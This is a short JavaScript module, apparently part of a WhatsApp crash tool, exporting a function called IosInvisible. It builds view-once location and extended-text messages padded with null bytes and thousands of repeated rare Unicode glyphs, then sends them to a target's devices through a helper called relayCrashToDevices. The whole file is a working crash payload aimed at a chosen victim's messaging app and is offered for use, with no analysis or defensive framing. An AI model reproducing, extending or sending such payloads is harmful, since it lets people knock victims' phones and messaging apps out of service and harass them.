const { relayCrashToDevices } = require('../target-utils');

async function IosInvisible(client, targetJid) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 139.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(1000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(1000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(1000)}.com`,
      };

      let extendMsg = {
         extendedTextMessage: {
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(2000),
            matchedText: ".welcome...",
            description: "𑇂𑆵𑆴𑆿".repeat(1000),
            title: "𑇂𑆵𑆴𑆿".repeat(1000),
            previewType: "NONE",
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      };

      let msg1 = { viewOnceMessage: { message: { locationMessage } } };
      let msg2 = { viewOnceMessage: { message: { extendMsg } } };

      const r1 = await relayCrashToDevices(client, targetJid, msg1);
      const r2 = await relayCrashToDevices(client, targetJid, msg2);

      return {
         success: r1.success || r2.success,
         deliveredCount: r1.deliveredCount + r2.deliveredCount,
         errors: [...r1.errors, ...r2.errors]
      };
   } catch (err) {
      console.error("[IosInvisible]", err.message);
      return { success: false, deliveredCount: 0, errors: [err.message] };
   }
}

module.exports = { IosInvisible };
